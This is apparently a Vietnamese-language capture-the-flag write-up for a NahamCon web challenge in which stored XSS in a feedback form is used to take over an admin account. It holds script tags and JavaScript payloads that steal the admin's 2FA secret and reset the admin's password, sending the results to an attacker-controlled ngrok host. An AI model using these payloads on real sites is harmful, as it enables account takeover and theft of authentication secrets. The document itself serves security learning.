# nahamcom CTF - Two For One

## Description
Need to keep things secure? Try out our safe, the most secure in the world!

## Solution

### Review
- Chall truy cập vào redirect đến register page, thử đăng kí username là admin thì báo lỗi username đã tồn tại => Có lẽ mục đích là trộm cắp gì đó của admin.

- Việc login và register yêu cầu scan QR 2FA để lấy code mỗi lần truy cập

- Quét QR xong, vào có trang chứa secret, có page settings gồm các chức năng: Reset password, Reset2FA và Feedback.

+ Phần reset password chỉ cần nhập mật khẩu muốn đổi + 2FA code

+ Phần reset 2FA chỉ cần scan QR code để đổi mới, khi request QR mới, một request được gửi đi và response về đường link chứa QR tựa như: 

http://challenge.nahamcon.com:31169/reset2fa
```
{"url":"otpauth://totp/Fort%20Knox:2?secret=VOEJIF5EA7UDKTAS&issuer=Fort%20Knox"}
```

+ Phần feedback dính lỗi XSS từ phía admin, trigger bằng cách đơn giản: 

<scirpt src="http://e405-42-112-56-248.ngrok.io/evil.js"></scirpt>

![setting](https://user-images.githubusercontent.com/71699412/167260883-9d76f2d0-b2cd-4469-8037-2896aff45b28.jpg)

### Exploit

**Ý tưởng**: Mục tiêu có lẽ là đánh cắp tài khoản admin để đọc được secret bằng cách lợi dụng XSS make request reset 2FA và nhận lại response trả về chứa QR code. Sau khi có QR code của admin, ta scan và lấy được 2FA code tiếp tục exploit XSS reset password với 2FA code của admin vừa có được. Reset password thành công, ta vào được tài khoản admin đọc secret.

**Step 1**: Đánh cắp QR code của admin qua XSS

Gửi feedback là: 
```html
<script src="http://e405-42-112-56-248.ngrok.io/evil_1.js"></script>
```
Link trên trỏ đến file js ta tự host để exploit XSS, file evil_1.js:

```js
var xhr = new XMLHttpRequest;
xhr.open("POST", "http://challenge.nahamcon.com:31169/reset2fa", true);
xhr.withCredentials = true;
xhr.onload = function() {
	var qr = btoa(xhr.responseText);
	var exit = new XMLHttpRequest;
	exit.open("GET", "http://e405-42-112-56-248.ngrok.io?qr=" + qr);
	exit.send();
};

xhr.send();
```

Từ link trả về, ta decode base64 được:
```json
{"url":"otpauth://totp/Fort%20Knox:admin?secret=L6EFVJEYQOQIZ4N7&issuer=Fort%20Knox"}
```

Ta dùng google `/chart` để generate QR code với secret trên: https://www.google.com/chart?chs=200x200&chld=MJ0&cht=qr&chl=otpauth://totp/Fort%20Knox:admin?secret=L6EFVJEYQOQIZ4N7&issuer=Fort%20Knox

**Step 2**: Với 2FA code, reset password của admin qua XSS

Gửi feedback là: 
```html
<script src="http://e405-42-112-56-248.ngrok.io/evil_2.js"></script>
```

file `evil_2.js`:
```js
var xhr = new XMLHttpRequest();
var url = "http://challenge.nahamcon.com:30299/reset_password";

xhr.open("POST", url, true);
xhr.setRequestHeader("Content-Type", "application/json;charset=UTF-8");

// debug
xhr.onload = function() {
	var status = btoa(xhr.responseText);
	var exit = new XMLHttpRequest;
	exit.open("GET", "http://e405-42-112-56-248.ngrok.io?status=" + status);
	exit.send();
};

// OPT vừa scan từ QR code của admin
xhr.send(JSON.stringify({"otp":"786746","password":"admin","password2":"admin"}));
```
GET /?status=eyJzdWNjZXNzIjp0cnVlfQo= ==> `{"success":true}`

![console](https://user-images.githubusercontent.com/71699412/167260871-c93f5cc3-9bf9-478b-9ff4-fc085499db91.jpg)

Login as admin với admin:admin

**flag**: `flag{96710ea6be916326f96de003c1cc97cb}`
